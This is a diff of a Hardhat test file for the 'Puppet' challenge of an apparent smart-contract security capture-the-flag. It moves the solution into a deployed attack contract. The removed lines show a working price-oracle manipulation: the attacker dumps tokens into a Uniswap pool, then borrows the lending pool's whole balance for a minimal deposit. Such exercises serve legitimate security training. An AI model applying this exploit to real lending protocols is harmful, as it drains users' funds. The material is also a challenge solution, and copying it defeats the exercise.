@@ -35,6 +35,8 @@ describe("[Challenge] Puppet", function () {
     const DamnValuableTokenFactory = await ethers.getContractFactory("DamnValuableToken", deployer);
     const PuppetPoolFactory = await ethers.getContractFactory("PuppetPool", deployer);
 
+    const PuppetAttackFactory = await ethers.getContractFactory("PuppetAttack", deployer);
+
     await ethers.provider.send("hardhat_setBalance", [
       attacker.address,
       "0x15af1d78b58c40000", // 25 ETH
@@ -58,6 +60,14 @@ describe("[Challenge] Puppet", function () {
 
     // Deploy the lending pool
     this.lendingPool = await PuppetPoolFactory.deploy(this.token.address, this.uniswapExchange.address);
+
+    //
+    this.puppetAttack = await PuppetAttackFactory.deploy(
+      this.token.address,
+      this.uniswapExchange.address,
+      this.lendingPool.address,
+      {value: ATTACKER_INITIAL_ETH_BALANCE}
+    );
 
     // Add initial token and ETH liquidity to the pool
     await this.token.approve(this.uniswapExchange.address, UNISWAP_INITIAL_TOKEN_RESERVE);
@@ -93,19 +103,9 @@ describe("[Challenge] Puppet", function () {
 
   it("Exploit", async function () {
     /** CODE YOUR EXPLOIT HERE */
-    // approvr Uniswap to spend our tokens
-    await this.token.connect(attacker).approve(this.uniswapExchange.address, ATTACKER_INITIAL_TOKEN_BALANCE);
-
-    // Sell tokens for ETH to unbalance ETH/Token ratio
-    await this.uniswapExchange.connect(attacker).tokenToEthSwapInput(
-      ATTACKER_INITIAL_TOKEN_BALANCE.sub(1), // All of them [lest 1wei to pass success conditions].
-      1, // We don't care how much ether we get back.
-      9999999999 // We don't care about the deadline.
-    );
-
-    // _computeOraclePrice is now balanced in our favour, deposit ETH to drain DVT tokens
-    let deposit = await this.lendingPool.calculateDepositRequired(POOL_INITIAL_TOKEN_BALANCE);
-    await this.lendingPool.connect(attacker).borrow(POOL_INITIAL_TOKEN_BALANCE, {value: deposit});
+    // approve Uniswap to spend our tokens
+    await this.token.connect(attacker).transfer(this.puppetAttack.address, ATTACKER_INITIAL_TOKEN_BALANCE);
+    await this.puppetAttack.connect(attacker).execute(ATTACKER_INITIAL_TOKEN_BALANCE);
   });
 
   after(async function () {
